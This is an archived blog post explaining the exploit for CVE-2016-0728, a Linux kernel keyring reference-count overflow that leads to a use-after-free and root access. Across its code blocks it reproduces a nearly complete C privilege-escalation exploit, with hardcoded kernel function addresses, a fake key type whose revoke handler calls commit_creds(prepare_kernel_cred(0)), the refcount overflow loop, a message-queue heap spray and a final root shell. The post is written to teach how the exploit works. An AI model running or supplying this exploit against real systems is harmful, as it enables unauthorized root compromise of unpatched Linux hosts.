<!DOCTYPE html>
<!-- saved from url=(0121)https://web.archive.org/web/20191230042727/http://dreamhack.it/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html -->
<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="./2016 - CVE20160728 Exploit Code Explained_files/analytics.js.下載"></script><script src="./2016 - CVE20160728 Exploit Code Explained_files/analytics.js(1).下載" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app211.us.archive.org';v.server_ms=279;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="./2016 - CVE20160728 Exploit Code Explained_files/bundle-playback.js.下載" charset="utf-8"></script>
<script type="text/javascript" src="./2016 - CVE20160728 Exploit Code Explained_files/wombat.js.下載" charset="utf-8"></script>
<script type="text/javascript">
  __wm.init("https://web.archive.org/web");
  __wm.wombat("http://dreamhack.it:80/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html","20191230042727","https://web.archive.org/","web","/_static/",
	      "1577680047");
</script>
<link rel="stylesheet" type="text/css" href="./2016 - CVE20160728 Exploit Code Explained_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="./2016 - CVE20160728 Exploit Code Explained_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>CVE20160728 Exploit Code Explained</title>
  <meta name="description" content="CVE-2016-0728 is a bug related with Linux keyring, it occurs that I use thisutility from time to time. So it’s a good chance to see what is happening. Thispo...">

  <link rel="canonical" href="https://web.archive.org/web/20191230042727/http://dreamhack.it/linux/2016/01/25/www.dreamhack.it/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html">

  <link rel="stylesheet" href="./2016 - CVE20160728 Exploit Code Explained_files/bootstrap.min.css">
  <!-- <link rel="stylesheet" href="/assets/css/icard_resume.css"> -->
  <link rel="stylesheet" href="./2016 - CVE20160728 Exploit Code Explained_files/font-awesome.min.css">
  <link rel="stylesheet" href="./2016 - CVE20160728 Exploit Code Explained_files/blog.css">
  <link rel="stylesheet" href="./2016 - CVE20160728 Exploit Code Explained_files/syntax.css">

  <link rel="icon" type="image/png" href="https://web.archive.org/web/20191230042727im_/http://dreamhack.it/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html">

  <!-- Google fonts -->
  <link rel="stylesheet" href="./2016 - CVE20160728 Exploit Code Explained_files/css" type="text/css">
  <link rel="stylesheet" href="./2016 - CVE20160728 Exploit Code Explained_files/css(1)" type="text/css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="assets/js/html5shiv.min.js"></script>
  <script src="assets/js/respond.min.js"></script>
  <![endif]-->

</head>

    <body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<style type="text/css">
body {
  margin-top:0 !important;
  padding-top:0 !important;
  /*min-width:800px !important;*/
}
</style>
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20191230042727/http://dreamhack.it:80/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html</div>
<div id="donato" style="position: relative; width: 100%; height: 265px;">
  <div id="donato-base" style="height: 265px;">
    <iframe id="donato-if" src="./2016 - CVE20160728 Exploit Code Explained_files/donate.html" scrolling="no" frameborder="0" style="width:100%; height:100%">
    </iframe>
  </div>
</div><script type="text/javascript">
__wm.bt(650,27,25,2,"web","http://dreamhack.it/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html","20191230042727",1996,"/_static/",["/_static/css/banner-styles.css?v=omkqRugM","/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
</script>
<!-- END WAYBACK TOOLBAR INSERT -->
        <header class="bloghead">
    <dev class="authorheader">
        <a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/">
            <img alt="My Avatar" src="./2016 - CVE20160728 Exploit Code Explained_files/picture.png">
        </a>
        <dev class="blogtitle">
            <h1><a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/">Shilong ZHAO</a></h1>
            <h5>  </h5>
        </dev>
    </dev>

    <nav class="menu" role="nav">
        <ul>
            <li><a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/">Home</a></li>
            <li>|</li>
            <li><a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/menu.html">Menu</a></li>
            <li>|</li>
            <li><a target="_blank" href="https://web.archive.org/web/20191230042727/https://github.com/shil0ng">Github</a></li>
            <li>|</li>
            <li><a target="_blank" href="https://web.archive.org/web/20191230042727/http://dreamhack.it/about.html"> About Me</a></li>
        </ul>
    </nav>
</header>


        <main class="blogmain">
            <header>
                <h1 class="article-title">CVE20160728 Exploit Code Explained</h1>
                <p class="article-time">
                    2016-01-25 00:00:00 +0100
                    <!-- , published <span></span> -->
                </p>
                <p class="article-hint">
                    In case you have any questions or suggestions, you can leave comments
                    <a href="https://web.archive.org/web/20191230042727/https://github.com/shil0ng/web/issues" target="_blank"> HERE </a>. Thanks!
                </p>
            </header>
            <p>CVE-2016-0728 is a bug related with Linux keyring, it occurs that I use this
utility from time to time. So it’s a good chance to see what is happening. This
post just serves to understand the exploit code. For more details of the bug,
see the original post in [1].</p>

<h2 id="backgrounds">Backgrounds</h2>

<p>It exploits the bug that there is an integer overflow, and the fact that when
the keyring’s reference count is 0, the keyring will be released, but due to the
memory management mechanism of Linux, the slab allocator makes it possible to
reuse the freed keyring structure memory, by preparing carefully what we can
sent to that piece of memory and execute the <code class="highlighter-rouge">revoke()</code> function in kernel mode,
it’s possible to gain the root privilege.</p>

<p>To know more about Linux Keyring utilities, see [3] and [6]. To know more about
Linux memory management, read [4] and [5].</p>

<p>If you are not familiar with C x86 function attributes, just reference [7].</p>

<h2 id="analysis-of-exploit-code">Analysis of Exploit Code</h2>

<p>The header file part, include header file <code class="highlighter-rouge">&lt;keyutils.h&gt;</code>. Remember to link the
<code class="highlighter-rouge">keyutils</code> library when compile the code.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;keyutils.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/ipc.h&gt;
#include &lt;sys/msg.h&gt;
</code></pre></div></div>

<p>In the following piece of code, <code class="highlighter-rouge">_commit_creds</code> is <code class="highlighter-rouge">typedef</code>ed as a pointer to
function, the function takes an <code class="highlighter-rouge">unsigned long</code> as a parameter and returns an
<code class="highlighter-rouge">integer</code>.</p>

<p>The function attribute <code class="highlighter-rouge">regparm(3)</code> causes the compiler to pass up to 3 integer
arguments in registers EAX, EDX, and ECX instead of on the stack. This could
<strong>improve the efficiency of critical code</strong> [8]. But this does not seem to be
necessary, since the compiler sometimes automatically optimizes the code.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
</code></pre></div></div>

<p><code class="highlighter-rouge">STRUCT_LEN</code> is the size of keyring structure minus the size of message</p>

<p>Functions <code class="highlighter-rouge">prepare_kernel_cred</code> and <code class="highlighter-rouge">commit_creds</code> are declared in
<code class="highlighter-rouge">include/linux/cred.h</code> [9] as</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extern struct cred *prepare_kernel_cred(struct task_struct *)

extern int commit_creds(struct cred *);
</code></pre></div></div>

<p>and are implemented in <code class="highlighter-rouge">cred.c</code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int commit_creds(struct cred *new)

struct cred *prepare_kernel_cred(struct task_struct *daemon)
</code></pre></div></div>

<p><code class="highlighter-rouge">prepare_kernel_cred</code> will prepare a set of credentials for a kernel service, if
a parameter If is supplied, then the security data will be derived from that;
otherwise if the parameter is null, they’ll be set to 0 and no groups, <strong>full
capabilities and no keys</strong>.</p>

<p><code class="highlighter-rouge">commit_creds</code> will install new credentials upon the current task.</p>

<p>Addresses of <code class="highlighter-rouge">commit_creds</code> and <code class="highlighter-rouge">prepare_kernel_cred</code> functions are static and
can be determined per Linux kernel version/android device. <strong>You have to modify
these two addresses</strong> in order to run the program on your own PC.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define STRUCT_LEN (0xb8 - 0x30)
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)
</code></pre></div></div>

<p>It is possible to view the addresses of these two functions from the kernel’s
symbol table.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[szhao@localhost ~]$cat /proc/kallsyms | grep commit_creds
ffffffff8109e310 T commit_creds
ffffffff818b8be0 r __ksymtab_commit_creds
ffffffff818d0c50 r __kcrctab_commit_creds
ffffffff818dea76 r __kstrtab_commit_creds
[szhao@localhost ~]$cat /proc/kallsyms | | grep prepare_kernel_cred
ffffffff8109e620 T prepare_kernel_cred
ffffffff818bfc10 r __ksymtab_prepare_kernel_cred
ffffffff818d4468 r __kcrctab_prepare_kernel_cred
ffffffff818dea3a r __kstrtab_prepare_kernel_cred
</code></pre></div></div>

<p>The user space keyring type [6][10] is</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};
</code></pre></div></div>

<p>the user space revoke function instead of the real one.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void userspace_revoke(void * key) {
    commit_creds(prepare_kernel_cred(0));
}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main(int argc, const char *argv[]) {
    const char *keyring_name;
    size_t i = 0;
    unsigned long int l = 0x100000000/2;
    key_serial_t serial = -1;
    pid_t pid = -1;
    struct key_type * my_key_type = NULL;
    struct {
        long mtype;
        char mtext[STRUCT_LEN];
    } msg = {0x4141414141414141, {0}};
    int msqid;
    if (argc != 2) {
        puts("usage: ./keys &lt;key_name&gt;");
        return 1;
    }
</code></pre></div></div>

<p>The following part prepares the <code class="highlighter-rouge">msg</code> which is going to be fitted to the kernel
memory. Note the content <code class="highlighter-rouge">msg.text</code> is rewritten, especially stored in
<code class="highlighter-rouge">&amp;msg.mtext[80]</code> is a pointer to <code class="highlighter-rouge">my_key_type</code> whose revoke function is
<code class="highlighter-rouge">userspace_revoke</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    printf("uid=%d, euid=%d\n", getuid(), geteuid());
    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;

    my_key_type = malloc(sizeof(*my_key_type));

    my_key_type-&gt;revoke = (void*)userspace_revoke;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // key-&gt;uid
    *(int*)(&amp;msg.mtext[56]) = 0x3e8; /* geteuid() */
    //key-&gt;perm
    *(int*)(&amp;msg.mtext[64]) = 0x3f3f3f3f;

    //key-&gt;type
    *(unsigned long *)(&amp;msg.mtext[80]) = (unsigned long)my_key_type;
</code></pre></div></div>

<p>Initialize the keyring and overflow the reference count</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }

    keyring_name = argv[1];

    /* Set the new session keyring before we start */

    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
    if (serial &lt; 0) {
        perror("keyctl");
        return -1;
    }

    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; 0) {
        perror("keyctl");
        return -1;
    }


    puts("Increfing...");
    for (i = 1; i &lt; 0xfffffffd; i++) {
        if (i == (0xffffffff - l)) {
            l = l/2;
            sleep(5);
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; 0) {
            perror("keyctl");
            return -1;
        }
    }
    sleep(5);
    /* here we are going to leak the last references to overflow */
    for (i=0; i&lt;5; ++i) {
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; 0) {
            perror("keyctl");
            return -1;
        }
    }

    puts("finished increfing");
</code></pre></div></div>

<p>Now, when the reference count of the keyring reaches 0, which is overflowed,
that piece of memory will be freed. But thanks to the Linux kernel <code class="highlighter-rouge">slab</code>, it is
possible to override the freed area in the kernel memory with prepared malicious
data, which has the same size of the keyring object.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    puts("forking...");
    /* allocate msg struct in the kernel rewriting the freed keyring object */
    for (i=0; i&lt;64; i++) {
        pid = fork();
        if (pid == -1) {
            perror("fork");
            return -1;
        }

        if (pid == 0) {
            sleep(2);
            if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
                perror("msgget");
                exit(1);
            }
            for (i = 0; i &lt; 64; i++) {
                if (msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0) == -1) {
                    perror("msgsnd");
                    exit(1);
                }
            }
            sleep(-1);
            exit(1);
        }
    }

    puts("finished forking");
    sleep(5);

    /* call userspace_revoke from kernel */
    puts("caling revoke...");
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
</code></pre></div></div>

<p>&nbsp;</p>

<h3 id="references">References</h3>

<p>[1] <a href="https://web.archive.org/web/20191230042727/http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">Perception Point
CVE-2016-0728</a></p>

<p>[2] <a href="https://web.archive.org/web/20191230042727/https://access.redhat.com/articles/2131021">Red Hat CVE-2016-0728</a></p>

<p>[3] <a href="https://web.archive.org/web/20191230042727/http://man7.org/linux/man-pages/man7/keyrings.7.html">Keyrings(7)</a></p>

<p>[4] <a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html">Understanding the Linux Kernel</a></p>

<p>[5] <a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/linux/2016/01/25/cve-2016-0728-exploit-code-explained.html">Linux Kernel Development</a></p>

<p>[6] <a href="https://web.archive.org/web/20191230042727/http://www.ibm.com/developerworks/library/l-key-retention/index.html">Get Started with the Linux Key Retention
Service</a></p>

<p>[7] <a href="https://web.archive.org/web/20191230042727/https://gcc.gnu.org/onlinedocs/gcc/x86-Function-Attributes.html/#x86-Function-Attributes">C Function
Attributes</a></p>

<p>[8] <a href="https://web.archive.org/web/20191230042727/http://mtk1985.blogspot.it/2012/10/gcc-function-attribute-regparam-and.html">Function regparm
attribute</a></p>

<p>[9] <a href="https://web.archive.org/web/20191230042727/http://lxr.free-electrons.com/source/include/linux/cred.h/#L169">Linux Kernel Functions Declaration Source
Code</a></p>

<p>[10] <a href="https://web.archive.org/web/20191230042727/http://lxr.free-electrons.com/source/include/linux/key-type.h">Linux Kernel Key Type
Structure</a></p>

            <footer class="article-footer">
    <div class="authorimage">
        <img src="./2016 - CVE20160728 Exploit Code Explained_files/picture.png" alt="My Avatar" class="img-circle">
    </div>
    <section class="author">
        <h4><a href="https://web.archive.org/web/20191230042727/http://dreamhack.it/about.html">ZHAO Shilong</a></h4>
        <a href="https://web.archive.org/web/20191230042727/mailto:zhao.s.long@gmail.com">zhao.s.long@gmail.com</a>
    </section>
</footer>

        </main>

        <div class="footer-copyright">
    <div class="container-fluid">
        <div class="row-fluid">
            <div class="col-md-12">
                Copyright © 2016 Shilong ZHAO - All rights reserved.
            </div>
        </div>
    </div>
</div>
<script type="text/javascript" src="./2016 - CVE20160728 Exploit Code Explained_files/jquery.min.js.下載"></script>
<script type="text/javascript" src="./2016 - CVE20160728 Exploit Code Explained_files/bootstrap.min.js.下載"></script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//web.archive.org/web/20191230042727/http://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-74743250-2', 'auto');
  ga('send', 'pageview');

</script>


    


<!--
     FILE ARCHIVED ON 04:27:27 Dec 30, 2019 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 17:52:16 Dec 02, 2021.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 150.402
  exclusion.robots: 0.17
  exclusion.robots.policy: 0.163
  RedisCDXSource: 0.958
  esindex: 0.008
  LoadShardBlock: 128.795 (3)
  PetaboxLoader3.datanode: 102.437 (4)
  CDXLines.iter: 17.678 (3)
  load_resource: 120.628
  PetaboxLoader3.resolve: 29.576
--></body></html>